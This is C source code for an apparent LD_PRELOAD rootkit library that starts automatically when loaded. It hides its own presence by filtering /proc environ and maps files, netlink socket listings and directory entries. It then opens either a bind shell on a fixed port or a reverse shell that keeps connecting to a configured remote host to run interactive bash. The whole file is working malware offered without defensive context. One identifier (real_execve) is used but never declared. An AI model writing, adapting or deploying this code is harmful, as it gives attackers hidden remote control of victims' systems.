#define _GNU_SOURCE
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <linux/netlink.h>
#include <linux/inet_diag.h>
#include <dirent.h>
#include <fcntl.h>
#include <errno.h>
#include <stdarg.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/mman.h>

static volatile int ghost_fd = -1;
static volatile int should_run = 1;

typedef int (*bind_t)(int, const struct sockaddr *, socklen_t);
typedef struct dirent* (*readdir_t)(DIR *);
typedef ssize_t (*recvmsg_t)(int, struct msghdr *, int);
typedef int (*open_t)(const char *, int, ...);
typedef int (*openat_t)(int, const char *, int, ...);
typedef ssize_t (*read_t)(int, void *, size_t);
typedef ssize_t (*write_t)(int, const void *, size_t);
typedef int (*close_t)(int);
typedef int (*setsockopt_t)(int, int, int, const void *, socklen_t);
typedef int (*memfd_create_t)(const char *, unsigned int);

static bind_t real_bind = NULL;
static readdir_t real_readdir = NULL;
static recvmsg_t real_recvmsg = NULL;
static open_t real_open = NULL;
static openat_t real_openat = NULL;
static read_t real_read = NULL;
static write_t real_write = NULL;
static close_t real_close = NULL;
static setsockopt_t real_setsockopt = NULL;
static memfd_create_t real_memfd_create = NULL;

static pthread_mutex_t ghost_fd_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t environ_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t maps_mutex = PTHREAD_MUTEX_INITIALIZER;

static int init_libc_funcs(void) {
    real_bind = (bind_t)dlsym(RTLD_NEXT, "bind");
    real_readdir = (readdir_t)dlsym(RTLD_NEXT, "readdir");
    real_recvmsg = (recvmsg_t)dlsym(RTLD_NEXT, "recvmsg");
    real_open = (open_t)dlsym(RTLD_NEXT, "open");
    real_openat = (openat_t)dlsym(RTLD_NEXT, "openat");
    real_read = (read_t)dlsym(RTLD_NEXT, "read");
    real_write = (write_t)dlsym(RTLD_NEXT, "write");
    real_close = (close_t)dlsym(RTLD_NEXT, "close");
    real_setsockopt = (setsockopt_t)dlsym(RTLD_NEXT, "setsockopt");
    real_memfd_create = (memfd_create_t)dlsym(RTLD_NEXT, "memfd_create");
    return 0;
}

static int is_ghost_path(const char *path) {
    if (!path) return 0;
    return (strstr(path, "/proc/self/maps") != NULL ||
            strstr(path, "/proc/self/environ") != NULL ||
            (strstr(path, "/proc/") != NULL && strstr(path, "/maps") != NULL) ||
            (strstr(path, "/proc/") != NULL && strstr(path, "/environ") != NULL));
}

static int is_ghost_openat(int dirfd, const char *path) {
    if (!path || dirfd == AT_FDCWD) return 0;
    
    if (path[0] == '/') {
        return is_ghost_path(path);
    }
    
    char fd_path[64];
    char proc_path[256];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", dirfd);
    
    ssize_t len = readlink(fd_path, proc_path, sizeof(proc_path) - 1);
    if (len <= 0) return 0;
    proc_path[len] = '\0';
    
    if (strstr(proc_path, "/proc/") != NULL && 
        strstr(proc_path, "/self") == NULL) {
        if (strcmp(path, "maps") == 0 || strcmp(path, "environ") == 0) {
            return 1;
        }
    }
    
    return 0;
}

static int create_filtered_memfd(const char *content, size_t len) {
    if (!real_memfd_create) {
        if (!real_close) init_libc_funcs();
        return -1;
    }
    
    int fd = real_memfd_create("", MFD_CLOEXEC);
    if (fd < 0) return -1;
    
    if (real_write(fd, content, len) != (ssize_t)len) {
        real_close(fd);
        return -1;
    }
    
    if (lseek(fd, 0, SEEK_SET) < 0) {
        real_close(fd);
        return -1;
    }
    
    return fd;
}

static int filter_environ_create_fd(const char *path) {
    pthread_mutex_lock(&environ_mutex);
    
    static char *filtered = NULL;
    static size_t filtered_size = 65536;
    
    if (!filtered) {
        filtered = calloc(1, filtered_size);
        if (!filtered) {
            pthread_mutex_unlock(&environ_mutex);
            return -1;
        }
    }
    
    memset(filtered, 0, filtered_size);
    
    if (!real_open || !real_read || !real_close) init_libc_funcs();
    
    int fd = real_open(path, O_RDONLY);
    if (fd < 0) {
        pthread_mutex_unlock(&environ_mutex);
        return -1;
    }
    
    char buffer[4096];
    size_t total = 0;
    ssize_t n;
    while ((n = real_read(fd, buffer, sizeof(buffer) - 1)) > 0 && total < filtered_size - 1) {
        buffer[n] = '\0';
        
        char *src = buffer;
        char *dst = filtered + total;
        while (*src && (size_t)(dst - filtered) < filtered_size - 1) {
            if (strncmp(src, "LD_PRELOAD=", 11) == 0) {
                src = strchr(src, '\n');
                if (!src) break;
                src++;
                continue;
            }
            *dst++ = *src++;
        }
        total = dst - filtered;
    }
    real_close(fd);
    
    int result_fd = -1;
    if (total > 0) {
        result_fd = create_filtered_memfd(filtered, total);
    }
    
    pthread_mutex_unlock(&environ_mutex);
    return result_fd;
}

static int filter_maps_create_fd(const char *path) {
    pthread_mutex_lock(&maps_mutex);
    
    static char *filtered = NULL;
    static size_t filtered_size = 262144;
    
    if (!filtered) {
        filtered = calloc(1, filtered_size);
        if (!filtered) {
            pthread_mutex_unlock(&maps_mutex);
            return -1;
        }
    }
    
    memset(filtered, 0, filtered_size);
    
    if (!real_open || !real_read || !real_close) init_libc_funcs();
    
    int fd = real_open(path, O_RDONLY);
    if (fd < 0) {
        pthread_mutex_unlock(&maps_mutex);
        return -1;
    }
    
    char buffer[4096];
    size_t total = 0;
    ssize_t n;
    while ((n = real_read(fd, buffer, sizeof(buffer) - 1)) > 0 && total < filtered_size - 1) {
        buffer[n] = '\0';
        
        char *src = buffer;
        char *dst = filtered + total;
        while (*src && (size_t)(dst - filtered) < filtered_size - 1) {
            if ((strstr(src, GHOST_SO_NAME) != NULL && 
                 (src == buffer || *(src-1) == '\n')) ||
                (strstr(src, "/tmp/") != NULL && strstr(src, ".so") != NULL)) {
                src = strchr(src, '\n');
                if (!src) break;
                src++;
                continue;
            }
            *dst++ = *src++;
        }
        total = dst - filtered;
    }
    real_close(fd);
    
    int result_fd = -1;
    if (total > 0) {
        result_fd = create_filtered_memfd(filtered, total);
    }
    
    pthread_mutex_unlock(&maps_mutex);
    return result_fd;
}

int open(const char *path, int flags, ...) {
    if (!real_open) init_libc_funcs();
    
    if ((flags & O_PATH) == O_PATH) {
        return real_open(path, flags);
    }
    
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, int);
        va_end(args);
    }
    
    if (is_ghost_path(path)) {
        if (strstr(path, "environ") != NULL) {
            int memfd = filter_environ_create_fd(path);
            if (memfd >= 0) {
                return memfd;
            }
        }
        else if (strstr(path, "maps") != NULL) {
            int memfd = filter_maps_create_fd(path);
            if (memfd >= 0) {
                return memfd;
            }
        }
    }
    
    return real_open(path, flags, mode);
}

int openat(int dirfd, const char *path, int flags, ...) {
    if (!real_openat) {
        init_libc_funcs();
    }
    
    if ((flags & O_PATH) == O_PATH) {
        return real_openat(dirfd, path, flags);
    }
    
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, int);
        va_end(args);
    }
    
    if (is_ghost_path(path)) {
        if (strstr(path, "environ") != NULL) {
            int memfd = filter_environ_create_fd(path);
            if (memfd >= 0) {
                return memfd;
            }
        }
        else if (strstr(path, "maps") != NULL) {
            int memfd = filter_maps_create_fd(path);
            if (memfd >= 0) {
                return memfd;
            }
        }
    }
    
    if (is_ghost_openat(dirfd, path)) {
        char full_path[256];
        char fd_path[64];
        snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", dirfd);
        ssize_t len = readlink(fd_path, full_path, sizeof(full_path) - 1);
        if (len > 0) {
            full_path[len] = '\0';
            if (strlen(full_path) + strlen(path) + 1 < sizeof(full_path)) {
                strcat(full_path, "/");
                strcat(full_path, path);
                
                if (strcmp(path, "environ") == 0) {
                    int memfd = filter_environ_create_fd(full_path);
                    if (memfd >= 0) {
                        return memfd;
                    }
                }
                else if (strcmp(path, "maps") == 0) {
                    int memfd = filter_maps_create_fd(full_path);
                    if (memfd >= 0) {
                        return memfd;
                    }
                }
            }
        }
    }
    
    return real_openat(dirfd, path, flags, mode);
}

struct dirent *readdir(DIR *dirp) {
    if (!real_readdir) real_readdir = (readdir_t)dlsym(RTLD_NEXT, "readdir");

    int fd_to_hide = ghost_fd;
    
    struct dirent *entry;
    while ((entry = real_readdir(dirp))) {
        if (fd_to_hide != -1) {
            char fd_str[16];
            snprintf(fd_str, sizeof(fd_str), "%d", fd_to_hide);
            if (strcmp(entry->d_name, fd_str) == 0) continue; 
        }
        break;
    }
    return entry;
}

ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags) {
    if (!real_recvmsg) real_recvmsg = (recvmsg_t)dlsym(RTLD_NEXT, "recvmsg");

    ssize_t ret = real_recvmsg(sockfd, msg, flags);
    if (ret <= 0 || !msg->msg_iov || msg->msg_iovlen <= 0) return ret;

    struct nlmsghdr *nlh = (struct nlmsghdr *)msg->msg_iov[0].iov_base;
    if (!nlh) return ret;
    
    ssize_t remaining = ret;

    while (NLMSG_OK(nlh, remaining)) {
        if (nlh->nlmsg_type == NLMSG_DONE) break;
        
        struct inet_diag_msg *diag = NLMSG_DATA(nlh);
        if (diag && diag->id.idiag_sport == htons(GHOST_PORT)) {
            size_t msg_len = NLMSG_ALIGN(nlh->nlmsg_len);
            unsigned char *next_msg = (unsigned char *)nlh + msg_len;
            ssize_t tail_size = remaining - msg_len;

            if (tail_size > 0) memmove(nlh, next_msg, tail_size);
            ret -= msg_len;
            remaining -= msg_len;
            if (ret <= 0) break;
            continue;
        }
        nlh = NLMSG_NEXT(nlh, remaining);
    }
    return ret;
}

#if GHOST_REVERSE_MODE
static void *ghost_reverse_shell(void *arg) {
    int sock_fd;
    struct sockaddr_in server_addr;
    
    prctl(PR_SET_NAME, FAKE_THREAD_NAME, 0, 0, 0);
    
    while (should_run) {
        if ((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
            sleep(GHOST_RETRY_DELAY);
            continue;
        }
        
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(GHOST_REVERSE_PORT);
        inet_pton(AF_INET, GHOST_REVERSE_HOST, &server_addr.sin_addr);
        
        if (connect(sock_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            close(sock_fd);
            sleep(GHOST_RETRY_DELAY);
            continue;
        }
        
        pthread_mutex_lock(&ghost_fd_mutex);
        ghost_fd = sock_fd;
        pthread_mutex_unlock(&ghost_fd_mutex);
        
        dup2(sock_fd, 0); dup2(sock_fd, 1); dup2(sock_fd, 2);
        unsetenv("LD_PRELOAD");
        
        if (real_execve) {
            real_execve("/bin/bash", (char*[]){"bash", "--noprofile", "--norc", "-i", NULL}, NULL);
        } else {
            execl("/bin/bash", "bash", "--noprofile", "--norc", "-i", NULL);
        }
        
        close(sock_fd);
        pthread_mutex_lock(&ghost_fd_mutex);
        ghost_fd = -1;
        pthread_mutex_unlock(&ghost_fd_mutex);
        
        sleep(GHOST_RETRY_DELAY);
    }
    
    return NULL;
}
#endif

void *ghost_listener(void *arg) {
    int server_fd, client_fd;
    struct sockaddr_in addr;
    int opt = 1;
    struct timeval tv;

    prctl(PR_SET_NAME, FAKE_THREAD_NAME, 0, 0, 0);
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) return NULL;
    
    int flags = fcntl(server_fd, F_GETFD, 0);
    if (flags >= 0) fcntl(server_fd, F_SETFD, flags | FD_CLOEXEC);

    if (real_setsockopt) {
        real_setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));
    } else {
        setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(GHOST_PORT);

    if (real_bind) {
        if (real_bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            close(server_fd);
            return NULL;
        }
    } else {
        if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            close(server_fd);
            return NULL;
        }
    }
    
    if (listen(server_fd, 3) < 0) {
        close(server_fd);
        return NULL;
    }
    
    pthread_mutex_lock(&ghost_fd_mutex);
    ghost_fd = server_fd;
    pthread_mutex_unlock(&ghost_fd_mutex);

    while (should_run) {
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(server_fd, &fds);
        
        int sel = select(server_fd + 1, &fds, NULL, NULL, &tv);
        if (sel < 0) {
            if (errno == EINTR) continue;
            break;
        }
        if (sel == 0) {
            if (access(KILL_SWITCH, F_OK) == 0) {
                should_run = 0;
                break;
            }
            continue;
        }
        
        client_fd = accept(server_fd, NULL, NULL);
        if (client_fd >= 0) {
            pid_t pid = fork();
            if (pid == 0) {
                int my_ghost_fd = ghost_fd;
                if (my_ghost_fd >= 0) close(my_ghost_fd);
                unsetenv("LD_PRELOAD");
                dup2(client_fd, 0); dup2(client_fd, 1); dup2(client_fd, 2);
                close(client_fd);
                execl("/bin/bash", "bash", "--noprofile", "--norc", "-i", NULL);
                exit(0);
            }
            close(client_fd);
            if (pid > 0) waitpid(pid, NULL, WNOHANG);
        }
    }
    
    pthread_mutex_lock(&ghost_fd_mutex);
    if (ghost_fd == server_fd) {
        close(server_fd);
        ghost_fd = -1;
    }
    pthread_mutex_unlock(&ghost_fd_mutex);
    
    return NULL;
}

int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    if (!real_bind) real_bind = (bind_t)dlsym(RTLD_NEXT, "bind");
    int opt = 1;
    if (real_setsockopt) {
        real_setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));
    } else {
        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));
    }
    return real_bind(sockfd, addr, addrlen);
}

__attribute__((constructor))
void init_ghost(void) {
    pthread_t tid;
    pthread_attr_t attr;
    
    init_libc_funcs();
    
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    
#if GHOST_REVERSE_MODE
    pthread_create(&tid, &attr, ghost_reverse_shell, NULL);
#else
    pthread_create(&tid, &attr, ghost_listener, NULL);
#endif
    pthread_attr_destroy(&attr);
}

__attribute__((destructor))
void cleanup_ghost(void) {
    should_run = 0;
    if (pthread_mutex_trylock(&ghost_fd_mutex) == 0) {
        if (ghost_fd >= 0) {
            close(ghost_fd);
            ghost_fd = -1;
        }
        pthread_mutex_unlock(&ghost_fd_mutex);
    }
}
